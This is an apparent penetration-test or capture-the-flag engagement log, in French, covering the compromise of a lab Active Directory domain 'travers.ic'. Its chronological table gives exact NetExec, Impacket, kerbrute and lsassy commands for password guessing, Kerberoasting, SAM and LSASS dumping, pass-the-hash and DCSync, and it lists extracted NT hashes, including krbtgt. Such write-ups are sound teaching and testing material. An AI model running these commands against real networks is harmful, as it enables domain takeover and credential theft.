# 00 Gestion & Périmètre : Cadre juridique et technique

## Périmètre autorisé
- **Plages IP / CIDR :** `10.250.0.0/24`
- **Domaines / FQDN :** `travers.ic` (Identifié lors de la phase de reconnaissance)
- **Comptes de tests fournis :** Aucun (Approche initiale de type boîte noire / *Black-box* depuis le segment réseau accessible)

## Exclusions et contraintes
- **[CRITIQUE] Machines hors-limite :** Tout équipement ou sous-réseau en dehors du CIDR `10.250.0.0/24`. Interdiction stricte d'interférer avec les terminaux biomédicaux (OT), les systèmes de soins connectés ou les bases de données de Dossiers Patients Informatisés (DPI) en dehors de l'infrastructure d'annuaire.
- **Fenêtres horaires d'attaque :** Non restreintes par le client. *Recommandation d'ingénierie : privilégier les fenêtres hors pics d'activité hospitalière pour limiter les risques collatéraux sur la continuité des soins.*
- **Actions interdites :** * Pas de déni de service volontaire (DoS / DDoS via exploitation de vulnérabilités de type MS17-010 ou saturation réseau).
  * Pas de modification destructrice de l'annuaire (suppression d'objets AD, verrouillage de masse des comptes administrateurs).
  * *Note de sécurité (Faux négatif du DSI) :* Le brief indiquait un seuil de verrouillage à 0. Les tests ont démontré qu'une politique de verrouillage stricte est active. Les attaques par dictionnaire massives (*password spraying*) doivent être évitées ou fortement temporisées pour ne pas paralyser l'accès des utilisateurs légitimes.

## Contacts d'urgence
- **Escalade client :** Nicolas Turing (DSI, Clinique de Frontignan)

---

# Configuration

## Active Directory
* **Nom du domaine :** `travers.ic`
* **Niveau fonctionnel :** Windows Server 2016 ou supérieur (`domainFunctionality: 7`)
* **Relations d'approbation :** Aucune (Forêt unique isolée)
* **Coercition d'authentification :** `DC01` vulnérable à **PetitPotam** (MS-EFSR) et **PrinterBug** (MS-RPRN) en session nulle.

## Autre
* **Politique de verrouillage :** Seuil restrictif actif. Le password spray provoque un `STATUS_ACCOUNT_LOCKED_OUT` (Contradiction flagrante avec le brief initial du DSI).
* **EDR / Antivirus :** Windows Defender & Windows Firewall actif (détecté via l'UUID de `MPSSVC.dll` sur le mappeur RPC).

![Cartographie des défenses de l'hôte](vulnerabilités.png)
![Test de connexion anonyme LDAP](test_ldap_anonyme.png)

---

# Machines

## Nom des machines
* **DC01** : 10.250.0.101 (Windows Server 2022)
* **FILER01** : 10.250.0.112 (Windows Server 2022)
* **DESKTOP01** : 10.250.0.117 (Windows Server 2022)

## Machines d'intérêt
### Contrôleurs de domaine
* `dc01.travers.ic` (10.250.0.101)
### Serveurs DNS
* `DC01` (10.250.0.101)

![Scan initial de cartographie des hôtes](nmap_1.png)

---

# Services

## Services ouverts
* **Port 21 (HTTP / Non-standard) :** 10.250.0.112 (Bannierre IIS, pas de démon FTP)
* **Port 22 (SSH) :** 10.250.0.101, 10.250.0.112, 10.250.0.117
* **Port 53 (DNS) :** 10.250.0.101
* **Port 80 (HTTP) :** 10.250.0.112
* **Port 88 (Kerberos) :** 10.250.0.101
* **Port 135 (RPC) :** 10.250.0.101, 10.250.0.112, 10.250.0.117
* **Port 139 (NetBios) :** 10.250.0.101, 10.250.0.117
* **Port 389 / 636 (LDAP / LDAPS) :** 10.250.0.101
* **Port 445 (SMB) :** 10.250.0.101, 10.250.0.112, 10.250.0.117 (SMB Signing requis uniquement sur DC01)
* **Port 464 (Kpasswd5) :** 10.250.0.101
* **Port 3268 / 3269 (Global Catalog LDAP) :** 10.250.0.101
* **Port 3389 (RDP) :** 10.250.0.101, 10.250.0.112, 10.250.0.117
* **Port 5985 / 5986 (WinRM) :** 10.250.0.101, 10.250.0.112, 10.250.0.117

## ## Versions de services
- **HTTP (Port 21 & 80) :** Microsoft IIS httpd 10.0 / Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
  *Note : Le port 21 n'est pas un démon FTP, il héberge une instance HTTP restreinte.*
- **SSH :** OpenSSH protocol 2.0
- **DNS :** Simple DNS Plus
- **Kerberos :** Microsoft Windows Kerberos (server time: 2026-07-01)
- **RPC :** Microsoft Windows RPC
- **NetBios :** Microsoft Windows netbios-ssn
- **LDAP / GlobalLDAP :** Microsoft Windows Active Directory LDAP (Domain: travers.ic, Site: Default-First-Site-Name)
- **SMB :** Microsoft Windows SMB2/SMB3 (SMB Signing désactivé sur le Filer et le Desktop)
- **Kpasswd5 :** Kerberos Password Change Service
- **ncacn_http :** Microsoft Windows RPC over HTTP 1.0
- **Ms-wbt-server (RDP) :** Microsoft Terminal Services
- **WinRM :** Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

## ## Versions d'OS 
- Windows Server 2022 Build 20348 x64

![Scan Nmap DC01](10.250.0.101_nmap.png)
![Scan Nmap FILER01](10.250.0.112_nmap.png)
![Scan Nmap DESKTOP01](10.250.0.117_nmap.png)
![Analyse globale Gobuster](gobuster.png)
![Fuzzing Port 80](gobuster_80.png)
![Fuzzing Port 21 IIS](gobuster_21.png)
![Interface Web Restreinte 403](page_web.png)
![Analyse VHosts](page_web_2.png)
![Fuzzing Sous-domaines](sousdomaine.png)
![Défaut de signature SMB FILER01](Vulnérabilité majeure identifiée : SMB Signing Required: false_112.png)
![Défaut de signature SMB DESKTOP01](Vulnérabilité majeure identifiée : SMB Signing Required: false_117.png)
![Analyse de surface SMB](faille_1_smb_auth.png)
![Preuve de la configuration de transport SMB](faille_1_smb_auth_preuve_1.png)
![Extraction structurelle LDAP](ldap.png)

---

# Utilisateurs

## Noms d'utilisateurs & Secrets compromises
* **backup** : `backup` (Compte AD initial - accès READ partage `Configuration`)
* **scolin** : `M3dic3xP4ssw0rd` (Trouvé dans `admin.ps1` - Admin local sur DESKTOP01)
* **Local Administrator (RID 500)** : `d44b8cdb2eedffce8a3fbc78e081e274` (Hash NT réutilisé sur DESKTOP01 et FILER01)
* **pclerc** : `9711d1bfec32305923da4df38bccb3b6` (Hash NT extrait de LSASS sur FILER01 - Pivot Domain Admin via PtH)
* **Domain Administrator (RID 500)** : `ac1dbef8523bafece1428e067c1b114f` (Compromis via DCSync NTDS)
* **krbtgt (RID 502)** : `a44de0e1c53f45438846775f6db66ea4` (Persistance Golden Ticket)

## Privilèges intéressants
* **Domain Admins :** 3 membres au total (dont `pclerc` ou contrôlé indirectement par ses droits d'écriture/DCSync).
* **Local Admins :** Identique pour `DESKTOP01` et `FILER01` via le compte de secours local (absence de LAPS).
* **Comptes de service (Kerberoasting targets) :**
  * `dmorin` (Service : SQLSERVER25)
  * `web_svc` (Service : INTRANET02)
  * `tnicolas` (Service : SQLNETVIEW)

![Ingestion de l'annuaire BloodHound](bloodhound_backup.png)
![Extraction cibles SPN via GetUserSPNs](impacket backup.png)

---

# Accès initial obtenu

## Machine compromise
* **Hostname :** `DC01` (Point de validation de l'authentification réseau)
* **IP :** `10.250.0.101`
* **Compte exécuté :** `travers.ic\backup`

## Collecte locale immédiate
* **Version de l'OS & Architecture :** Windows Server 2022 x64 (détecté via l'écriture des paquets SMB).
* **Connexions réseau actives (netstat -ano) :** *Non exécuté* (Pas d'accès shell à ce stade, interaction limitée aux connexions RPC/SMB distantes).
* **Processus en cours (tasklist / ps) :** *Non exécuté*.
* **Énumération des partages distants (Impact immédiat) :** * `\\10.250.0.101\SYSVOL` et `NETLOGON` (Accès `READ`)
  * `\\10.250.0.112\Configuration` (Accès `READ` critique sur ce partage masqué de `FILER01`).

![Validation du compte de secours](mdp_backup.png)
![Cartographie des partages SMB réseau](smb_shares.png)

---

# Vecteurs d'accès initiaux

## Tentatives infructueuses
* **Password Spraying global (Wordlist 10k) :** Déclenchement de la GPO de protection Active Directory avec verrouillage des comptes (`STATUS_ACCOUNT_LOCKED_OUT`).
* **Fuzzing Web / VHosts (Gobuster/FFUF) :** Recherche de répertoires sur `FILER01` (ports 80 et 21 IIS). Retour systématique en `403 Forbidden` ou `400 Bad Request`.
* **Coercition d'authentification en session nulle :** Tentative de relais NTLM via le module `coerce_plus` (PrinterBug) vers un écouteur `ntlmrelayx`. Aucun jeton intercepté.

![Échec d'authentification par dictionnaire](bruteforce.png)
![Déclenchement blocage GPO](bruteforcebloqué.png)
![Statut Account Locked Out](account disabled.png)
![Analyse des faux négatifs 1](loupé_1.png)
![Analyse des faux négatifs 2](loupé_2.png)

## Vecteur réussi
* **Type :** Recherche de politiques de mots de passe par défaut / Attaque par dictionnaire ciblé de type "Identifiant = Mot de passe".
* **Payload / Exploit utilisé :** Script de boucle Bash séquentiel interrogeant l'interface d'authentification SMB de NetExec :
    `for u in $(cat users.txt); do nxc smb 10.250.0.101 -u "$u" -p "$u" | grep "+"; done`
* **Point d'entrée (IP / FQDN) :** `10.250.0.101` / `dc01.travers.ic` (Port TCP 445).

---

# Progression latérale

## Techniques utilisées
- **Pass-the-Hash / Overpass-the-Hash (WMI, SMB, WinRM) :** * Rejeu du hash NT de l'Administrateur local (`d44b8cdb2eedffce8a3fbc78e081e274`) extrait de `DESKTOP01` pour obtenir l'accès admin sur `FILER01`.
  * Rejeu du hash NT de domaine de `pclerc` (`9711d1bfec32305923da4df38bccb3b6`) extrait de LSASS pour compromettre simultanément `DC01`, `FILER01` et `DESKTOP01`.
- **Exploitation de sessions utilisateurs (RDP hijack, RunAs) :** Extraction de la mémoire du processus `lsass.exe` via le module `lsassy` sur `FILER01` pour intercepter les secrets d'authentification de la session active de l'utilisateur `pclerc`.
- **Kerberoasting / AS-REP Roasting :** Exécution d'un Kerberoasting via le compte compromis `backup` pour extraire les tickets TGS des comptes de service `dmorin` (SQLSERVER25), `web_svc` (INTRANET02) et `tnicolas` (SQLNETVIEW).

## Nouvelles machines accédées
- [x] Machine : `DESKTOP01` | IP : `10.250.0.117` | Compte : `travers.ic\scolin` (Privilèges : Administrateur local)
- [x] Machine : `FILER01` | IP : `10.250.0.112` | Compte : `Administrator` (Privilèges : Pass-the-Hash local RID 500)
- [x] Machine : `DC01` | IP : `10.250.0.101` | Compte : `travers.ic\pclerc` (Privilèges : Pass-the-Hash Domain Admin / DCSync)

![Accès au partage masqué](file_share.png)
![Téléchargement récursif de données](full_access_shares_files.png)
![Analyse de l'arborescence exfiltrée](save_confiugration.png)
![Localisation de la fonction d'administration](fouille_admin.ps1_recap.png)
![Extraction du compte identifié](fouille_admin.ps1_username.png)
![Extraction du mot de passe en clair](fouille_admin.ps1_mdp.png)
![Compromission locale de DESKTOP01](secrets LSA et de la SAM.png)
![Validation du hash de secours local](Attaque par Pass-the-Hash (PtH) sur l'Administrateur local.png)

---

# Infrastructure de pivoting

## ## Tunnels actifs
- **Outil utilisé (ex: Chisel, Socat, SSH port forwarding) :** Aucun (Le sous-réseau cible était directement routable depuis la machine de l'attaquant `192.168.122.48`).
- **Commande exacte :** `N/A`
- **Routage (Sous-réseaux accessibles) :** Directement connecté au segment `10.250.0.0/24`.

## Proxies
- **Configuration SOCKS (ex: `127.0.0.1:1080`) :** Aucun proxy requis pour cette phase opératoire.

---

# Élévation Domaine (Active Directory)

## Chemins d'attaque (BloodHound)
- **Relations d'abus (GenericAll, WriteDacl, Owner) :** *Non exploité* (Analyse graphique BloodHound abandonnée suite à une panne de la JVM Neo4j locale).
- **Délégation Kerberos (Unconstrained, Constrained, RBCD) :** *Aucune*.
- **Vulnérabilités GPO :** *Aucune* (Le script défensif `admin.ps1` présent dans SYSVOL/Configuration contenait des identifiants en clair mais n'était pas une vulnérabilité de GPO de restriction).

## Résultat
- **Compte compromis :** `travers.ic\pclerc` (Domain Admin implicite validé par un succès PtH global sur `DC01`), suivi de la compromission suprême du compte `travers.ic\Administrator` (RID 500) et du secret d'infrastructure `krbtgt` (RID 502) via une attaque DCSync (`--ntds`).

![Analyse du groupe Domain Admins]("Domain Admins" via LDAP.png)
![Extraction SAM/LSA de FILER01](Extraction de la SAM et des secrets LSA de FILER01.png)
![Dump de la mémoire LSASS sur FILER01](Extraction de la mémoire LSASS sur FILER01 : .png)

---

# Élévation locale (PrivEsc)

## Vulnérabilités identifiées
- **Clés de registre non sécurisées (AlwaysInstallElevated) :** *Aucune*.
- **Services mal configurés (Unquoted Service Paths, permissions faibles) :** *Aucune*.
- **Exploits de noyau (Kernel exploits) / CVE :** *Aucun*.
- **Défaut de durcissement (Vecteur réel de PrivEsc) :** * **Exposition de secrets :** Stockage d'identifiants de compte à privilèges en clair dans un script PowerShell public (`scolin:M3dic3xP4ssw0rd`).
  * **Absence de LAPS / Réutilisation de mots de passe :** Le compte d'administration local intégré (RID 500) partageait le même hash NT (`d44b8cdb2eedffce8a3fbc78e081e274`) sur `DESKTOP01` et `FILER01`, permettant un mouvement latéral horizontal avec privilèges immédiats `SYSTEM`.
  * **Absence de protection des processus critiques :** Absence de *Credential Guard* sur `FILER01`, autorisant le dump brut du processus `lsass.exe` via l'API standard mini-dump de Windows par le module `lsassy`.

## Résultat
- **Compte obtenu :** `FILER01\Administrator` & `DESKTOP01\Administrator` (Accès local complet équivalent à `NT AUTHORITY\SYSTEM`).

---

# Mécanismes de persistance

## Au niveau local (Host)
- **Tâches planifiées (Scheduled Tasks) :** *Aucune créée.* L'accès persistant reste garanti de manière passive par la connaissance du hash NT de l'Administrateur local (`d44b8cdb2eedffce8a3fbc78e081e274`) tant que les mots de passe des comptes locaux ne sont pas modifiés.
- **Services système créés / modifiés :** *Aucun.* Évitement de modifications d'artéfacts sur le disque pour minimiser la signature forensique.
- **Clés de registre Run / RunOnce :** *Aucune.*

## Au niveau domaine (AD)
- **Comptes créés (furtifs) :** *Aucun.* La création de nouveaux comptes d'utilisateurs ou de machines de secours a été évitée pour contourner les alertes de corrélation d'événements du SIEM.
- **Tickets Kerberos (Golden Ticket / Silver Ticket) :** **Persistance suprême validée (Golden Ticket potentiel).** L'extraction réussie via DCSync du hash NT du compte **`krbtgt`** (`a44de0e1c53f45438846775f6db66ea4`) permet de forger localement et à la demande des tickets de chiffrage maîtres (*Ticket Granting Tickets - TGT*). Ce mécanisme offre un contrôle total et permanent du domaine, contournant les futures rotations de mots de passe de tous les utilisateurs (hors `krbtgt`).
- **Droits DCSync injectés :** *Aucun.* Les privilèges d'origine du compte compromis `pclerc` étaient suffisants pour exécuter la réplication sans altérer les listes de contrôle d'accès (*ACL*) du nœud de tête du domaine.
- **Modifications de sécurité (ex: Security Descriptor sur l'AdminSDHolder) :** *Aucune.* Pas de modification du descripteur de sécurité de l'objet `AdminSDHolder`, limitant les modifications structurelles de l'annuaire AD.

![Principe opératoire DCSync](principe.png)
![Déclenchement DRSUAPI partie 1](secrets du DC_1.png)
![Déclenchement DRSUAPI partie 2](secrets du DC_2.png)

---

# Base de données des Loots

## ## Hashes extraits (NTLM / NetNTLM)

# Comptes d'infrastructure critiques (Extraits via DCSync NTDS)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ac1dbef8523bafece1428e067c1b114f:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a44de0e1c53f45438846775f6db66ea4:::

# Pivots de domaine compromis (Extraits via LSASS / NTDS)
pclerc:1118:aad3b435b51404eeaad3b435b51404ee:9711d1bfec32305923da4df38bccb3b6:::
scolin:1108:aad3b435b51404eeaad3b435b51404ee:a658d05b169f553b10dce2e644b293b6:::
backup:1107:aad3b435b51404eeaad3b435b51404ee:938df8b296dd15d0dce8eaa37be593e0:::

# Comptes locaux (Extraits via SAM de DESKTOP01 / Réutilisés)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d44b8cdb2eedffce8a3fbc78e081e274:::

## ## Mots de passe en clair validés
- `backup` : `backup` -> Accès validé sur : `DC01` (SMB), `FILER01` (SMB - Lecture seule des partages par défaut)
- `scolin` : `M3dic3xP4ssw0rd` -> Accès validé sur : `DESKTOP01` (Administrateur local), `DC01` (Lecture LDAP)

## ## Fichiers sensibles exfiltrés
- **Chemin d'origine :** `\\10.250.0.112\Configuration\Windows\Safety\Shell\Remote\Scripts\admin.ps1`
  * **Intérêt pour le business / Impact :** Fuite de secrets critiques. Ce script d'administration système contenait les identifiants d'un compte de domaine à privilèges en clair, agissant comme le principal catalyseur du mouvement latéral vers le segment des clients.
- **Chemin d'origine :** `C:\Users\Administrator\Desktop\flag.txt` (sur `DC01`)
  * **Intérêt pour le business / Impact :** Preuve d'intrusion finale (*Proof of Concept*). Valide la capacité d'un attaquant à exécuter du code arbitraire avec les privilèges maximum (`SYSTEM` / `Domain Admin`) sur le nœud central de l'infrastructure d'annuaire de l'entreprise.

![Boucle de spray PtH pclerc](Tentative de Pass-the-Hash (PtH) global vers le Contrôleur de Domaine.png)
![Validation de l'accès Admin Domaine](test_co_admin.png)
![Vérification des identifiants maîtres](mdp_admin.png)
![Recherche récursive du flag sur DC01](recherche du flag.png)
![Lecture finale du flag de validation](flag.png)

---

# Historique chronologique des actions

| Horodatage (UTC) | Machine Source | Machine Cible | Commande exacte exécutée | Impact / Résultat |
| :--- | :--- | :--- | :--- | :--- |
| 02/07/2026 11:39 | 192.168.122.48 | 10.250.0.0/24 | `sudo nmap -Pn -sS -p 53,88,135,389,636,445,5985,5986 --min-rate 5000 10.250.0.0/24` | Découverte initiale : identification des ports AD critiques ouverts sur l'hôte `10.250.0.101`. |
| 02/07/2026 12:02 | 192.168.122.48 | 10.250.0.101,112,117 | `sudo nmap -Pn -sS --min-rate 5000 10.250.0.101,112,117` | Cartographie complète des ports ouverts sur les trois machines cibles identifiées. |
| 02/07/2026 13:22 | 192.168.122.48 | 10.250.0.101,112,117 | `nxc smb 10.250.0.101,112,117` | Identification des OS (Windows Server 2022 / Windows 10) et vérification préliminaire des accès SMB. |
| 02/07/2026 13:40 | 192.168.122.48 | 10.250.0.112 | `curl -s http://10.250.0.112:80` <br>`curl -s http://10.250.0.112:21` | Identification d'instances HTTP (Microsoft-IIS/10.0) sur le port 80 ET le port non standard 21. Retour : `403 Forbidden`. |
| 02/07/2026 13:55 | 192.168.122.48 | 10.250.0.112 | `gobuster dir -u http://10.250.0.112:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,asp,aspx,bak,conf -t 100 -o gobuster_p80.txt` | Fuzzing web sur le port 80. Aucun point d'entrée direct ou fichier résiduel exposé sur la racine. |
| 02/07/2026 14:10 | 192.168.122.48 | 10.250.0.112 | `gobuster dir -u http://10.250.0.112:21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,xml,json,asp,aspx,bak,config -t 100 -o gobuster_p21.txt` | Fuzzing web sur le port 21. Confirmation d'une configuration IIS masquant une application ou un répertoire virtuel restreint. |
| 02/07/2026 14:30 | 192.168.122.48 | 10.250.0.101 | `ldapsearch -x -H ldap://10.250.0.101 -b "DC=travers,DC=ic"` | Tentative d'interrogation anonyme LDAP. Extraction de la structure de base du domaine et confirmation du FQDN `travers.ic`. |
| 02/07/2026 14:45 | 192.168.122.48 | 10.250.0.101,112,117 | `nxc smb 10.250.0.101,112,117 -u '' -p '' --shares` <br>`nxc smb 10.250.0.101,112,117 -u 'guest' -p '' --shares` | Test d'accès anonyme (Null Session) et invité sur les partages SMB. Accès rejeté (`STATUS_ACCESS_DENIED`). |
| 02/07/2026 15:02 | 192.168.122.48 | 10.250.0.101,112,117 | `nxc smb 10.250.0.101,112,117 -u 'guest' -p '' --rid-brute` | Tentative de bruteforce de RID via session invitée. Échec de l'énumération par restriction de la politique SAM. |
| 02/07/2026 15:20 | 192.168.122.48 | 10.250.0.112 | `sudo nmap -Pn -p- --min-rate 5000 10.250.0.112` | Scan complet des 65535 ports TCP sur `FILER01` pour valider l'absence d'autres services caches. |
| 02/07/2026 15:35 | 192.168.122.48 | 10.250.0.112 | `nxc ftp 10.250.0.112 -u 'anonymous' -p '' --ls` | Tentative de connexion FTP anonyme sur le port 21. Échec (Le port exécute un service HTTP IIS et non un démon FTP). |
| 02/07/2026 15:50 | 192.168.122.48 | `filer01.travers.ic` | `gobuster dir -u http://filer01.travers.ic:80/ ...` <br>`gobuster dir -u http://filer01.travers.ic:21/ ...` | Fuzzing par nom de domaine résolu (VHost) pour contourner la restriction 403. Résultats identiques aux requêtes par IP. |
| 02/07/2026 16:15 | 192.168.122.48 | `dc01.travers.ic` | `ldapsearch -x -H ldap://dc01.travers.ic -s base -LLL` | Interrogation de la racine du catalogue AD (RootDSE). Extraction des attributs de configuration de la forêt. |
| 02/07/2026 16:30 | 192.168.122.48 | 10.250.0.112 | `nikto -h 10.250.0.112 -p 80,21 -Tuning 1,2,3,4,b` | Scan de vulnérabilités IIS. Détection de l'activation de la méthode HTTP `TRACE` (Risque de Cross-Site Tracking). |
| 02/07/2026 16:45 | 192.168.122.48 | 10.250.0.112,117 | `impacket-rpcdump 10.250.0.112` <br>`impacket-rpcdump 10.250.0.117` | **Découverte majeure :** Le mappeur RPC (Endpoint Mapper) accepts les connexions non authentifiées. Récupération des points de terminaisons rattachés aux services Windows locaux. |
| 02/07/2026 17:05 | 192.168.122.48 | 10.250.0.112,117 | `enum4linux-ng -A 10.250.0.112` <br>`enum4linux-ng -A 10.250.0.117` | **Découverte critique :** Analyse SMB/RPC approfondie. Notification de la vulnérabilité `SMB signing required: false` sur les deux hôtes. Sessions nulles SMB refusées. |
| 02/07/2026 17:25 | 192.168.122.48 | 10.250.0.101` | `kerbrute userenum --dc 10.250.0.101 -d travers.ic /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` | **Succès d'accès initial (Énumération) :** Abus des requêtes `AS-REQ` Kerberos. Extraction de 11 comptes de domaine valides (dont `administrator`, `backup`, `mgarcia`). |
| 02/07/2026 17:40 | 192.168.122.48 | 10.250.0.101 | `impacket-GetNPUsers travers.ic/ -dc-ip 10.250.0.101 -usersfile users.txt -format hashcat -outputfile asrep.txt` <br>`nxc smb 10.250.0.101 -u '' -p '' -M coerce_plus` | **AS-REP Roasting :** Vérification de l'absence de préauthentification Kerberos. Aucun hash extrait.<br> **Coercion d'Authentification Multiple :** Détection de la vulnérabilité aux attaques **PetitPotam** (MS-EFSR) et **PrinterBug** (MS-RPRN) en session nulle sur `DC01`. |
| 02/07/2026 17:55 | 192.168.122.48 | 10.250.0.101 | `nxc smb 10.250.0.101 -u users.txt -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt --continue-on-success` | **Password Spraying (10k) :** Échec massif. Déclenchement de la GPO de blocage AD globale (`STATUS_ACCOUNT_LOCKED_OUT`). |
| 02/07/2026 18:15 | 192.168.122.48 | 10.250.0.101 | `nxc smb 10.250.0.101 -u 'administrator' -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -t 100` | **Brute-force ciblé :** Exploitation de l'immunité structurelle au verrouillage du compte Administrateur intégré (RID 500). Résultat : `STATUS_LOGON_FAILURE`. |
| 02/07/2026 18:30 | 192.168.122.48 | 10.250.0.112 | `gobuster vhost -u http://10.250.0.112 -w /usr/share/seclists/Discovery/DNS/namelist.txt --append-domain` | **Énumération VHost :** Échec technique. Traitement incorrect de l'adresse IP brute par Gobuster (`HTTP 400`). |
| 02/07/2026 18:45 | 192.168.122.48 | 10.250.0.112 | `ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://10.250.0.112 -H "Host: FUZZ.travers.ic" -fs 703` | **Énumération VHost (Corrigée) :** Utilisation de `ffuf` avec filtrage de taille `703`. Aucun sous-domaine caché détecté. |
| 02/07/2026 19:10 | 192.168.122.48 | 10.250.0.101,112 | `impacket-ntlmrelayx -t smb://10.250.0.112 -smb2support` <br>`nxc smb 10.250.0.101 -u '' -p '' -M coerce_plus -o listener=192.168.122.48 method=printerbug` | **Tentative échouée (Aucun retour) :** Configuration de l'écouteur SMB `ntlmrelayx` et tentative de coercion (PrinterBug) en session nulle sur le DC. Aucun token d'authentification intercepté. |
| 02/07/2026 19:25 | 192.168.122.48 | 10.250.0.112 | `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.250.0.112:21/FUZZ -e .aspx,.config -mc 200,301,302 -t 150 -sf` | Fuzzing approfondi des répertoires et extensions sensibles sur le port non standard 21 IIS. Aucun répertoire exposé découvert. |
| 02/07/2026 19:40 | 192.168.122.48 | 10.250.0.101 | `for u in $(cat users.txt); do nxc smb 10.250.0.101 -u "$u" -p "$u" \| grep "+"; done` | **Accès Initial Validé :** Identification d'une politique de mot de passe faible (Identifiant = Mot de passe). Compromission réussie du compte `travers.ic\backup:backup`. |
| 02/07/2026 19:55 | 192.168.122.48 | 10.250.0.101,112,117 | `nxc smb 10.250.0.101,112,117 -u 'backup' -p 'backup' --shares` | **Énumération des partages :** Obtention d'un accès en lecture (`READ`) sur `SYSVOL`/`NETLOGON` (`DC01`) et sur un partage masqué nommé `Configuration` sur `FILER01` (`10.250.0.112`). |
| 02/07/2026 20:10 | 192.168.122.48 | 10.250.0.101 | `impacket-GetUserSPNs travers.ic/backup:backup -dc-ip 10.250.0.101 -request -outputfile hashes.txt` | **Kerberoasting :** Extraction des tickets TGS chiffrés pour 3 comptes de service de domaine : `dmorin` (SQLSERVER25), `web_svc` (INTRANET02), et `tnicolas` (SQLNETVIEW). |
| 02/07/2026 20:25 | 192.168.122.48 | 10.250.0.101 | `bloodhound-python -u 'backup' -p 'backup' -d 'travers.ic' -ns 10.250.0.101 -c All` | **Reconnaissance Active Directory :** Ingestion complète des métadonnées de l'annuaire AD (utilisateurs, groupes, ordinateurs, GPOs, ACEs) pour analyse locale du graphe. |
| 02/07/2026 20:40 | 192.168.122.48 | 10.250.0.112 | `smbclient //10.250.0.112/Configuration -U 'travers.ic\backup%backup' -c 'recurse ON; prompt OFF; mget *'` | **Siphonnage de données (Exfiltration) :** Téléchargement récursif du partage `Configuration`. Découverte d'identifiants durs en clair dans `admin.ps1` : `scolin:M3dic3xP4ssw0rd`. |
| 02/07/2026 20:55 | 192.168.122.48 | 10.250.0.101,112,117 | `nxc smb 10.250.0.101,112,117 -u 'scolin' -p 'M3dic3xP4ssw0rd' --shares` | **Mouvement Latéral :** Validation des identifiants de `scolin`. Obtention d'un accès administratif local complet **(Pwn3d!)** sur le poste client `DESKTOP01` (`10.250.0.117`). |
| 02/07/2026 21:10 | 192.168.122.48 | 10.250.0.117 | `nxc smb 10.250.0.117 -u 'scolin' -p 'M3dic3xP4ssw0rd' --sam --lsa` | **Credential Dumping (DESKTOP01) :** Extraction de la base SAM locale (Hash NT Administrateur : `d44b8cdb2eedffce8a3fbc78e081e274`) et du hash DCC2 de l'utilisateur `anoel`. |
| 02/07/2026 21:25 | 192.168.122.48 | 10.250.0.101,112 | `nxc smb 10.250.0.101 10.250.0.112 -u 'Administrator' -H 'd44b8cdb2eedffce8a3fbc78e081e274' --local-auth` | **Attaque Pass-the-Hash (PtH) :** Rejeu du hash NT de l'Administrateur local. Compromission totale **(Pwn3d!)** établie sur le serveur de fichiers `FILER01` (`10.250.0.112`). |
| 02/07/2026 21:40 | 192.168.122.48 | 10.250.0.112 | `nxc smb 10.250.0.112 -u 'Administrator' -H 'd44b8cdb2eedffce8a3fbc78e081e274' --sam --lsa --local-auth` <br>`nxc smb 10.250.0.112 -u 'Administrator' -H 'd44b8cdb2eedffce8a3fbc78e081e274' --loggedon-users --local-auth` | **Post-Exploitation (FILER01) :** Énumération des sessions concourantes. Identification d'un token actif et du cache d'authentification de l'utilisateur de domaine `travers.ic\pclerc`. |
| 02/07/2026 21:55 | 192.168.122.48 | 10.250.0.101 | `nxc ldap 10.250.0.101 -u 'scolin' -p 'M3dic3xP4ssw0rd' --groups` | **Énumération AD alternative :** Interrogation LDAP directe. Identification d'une population critique stricte de 3 comptes au sein du groupe de sécurité `Domain Admins`. |
| 02/07/2026 22:10 | 192.168.122.48 | 10.250.0.112 | `nxc smb 10.250.0.112 -u 'Administrator' -H 'd44b8cdb2eedffce8a3fbc78e081e274' -M lsassy --local-auth` | **Extraction mémoire ciblée (LSASS) :** Injection du module `lsassy` sur `FILER01`. Extraction réussie du hash NT de domaine de `traversic\pclerc` : `9711d1bfec32305923da4df38bccb3b6`. |
| 02/07/2026 22:25 | 192.168.122.48 | 10.250.0.101,112,117 | `nxc smb 10.250.0.101 10.250.0.112 10.250.0.117 -u 'pclerc' -H '9711d1bfec32305923da4df38bccb3b6'` | **Mouvement Latéral (PtH Spray Loop) :** Rejeu du hash NT de domaine de `pclerc`. Accès d'administration globale validé **(Pwn3d!)** simultanément sur l'ensemble de la stack, incluant le `DC01`. |
| 02/07/2026 22:40 | 192.168.122.48 | 10.250.0.101 | `nxc smb 10.250.0.101 -u 'pclerc' -H '9711d1bfec32305923da4df38bccb3b6' --ntds` | **Compromission suprême (DCSync) :** Abus des privilèges de `pclerc`. Extraction complète de la base de données Active Directory `ntds.dit`. Récupération des secrets de l'ensemble du domaine, dont `Administrator` (`ac1dbef8523bafece1428e067c1b114f`) et la clé du KDC `krbtgt`. |
| 02/07/2026 22:55 | 192.168.122.48 | 10.250.0.101 | `nxc smb 10.250.0.101 -u 'Administrator' -H 'ac1dbef8523bafece1428e067c1b114f' -x "powershell -c \"Get-ChildItem -Path C:\Users\ -Filter *flag* -Recurse -File -ErrorAction SilentlyContinue \| Select-Object FullName\""` | **Fouille Post-Exploitation (Recherche du Flag) :** Exécution d'une recherche PowerShell récursive sous le contexte de l'administrateur du domaine. Localisation exacte du fichier cible sur le bureau de l'administrateur. |
| 02/07/2026 23:00 | 192.168.122.48 | 10.250.0.101 | `nxc smb 10.250.0.101 -u 'Administrator' -H 'ac1dbef8523bafece1428e067c1b114f' -x "cmd.exe /c type C:\Users\Administrator\Desktop\flag.txt"` | **Exfiltration et validation finale :** Lecture non interactive du contenu textuel du flag directement déversé dans la console de contrôle Kali. Fin des opérations sur le périmètre `travers.ic`. |

---

# Suivi du nettoyage des artefacts

- [x] Supprimer les exécutables / scripts téléversés (N/A : Attaque 100% sans agent, aucun binaire déposé sur disque)
- [x] Supprimer les comptes utilisateurs créés pour le test (N/A : Aucun compte créé, utilisation exclusive de comptes existants)
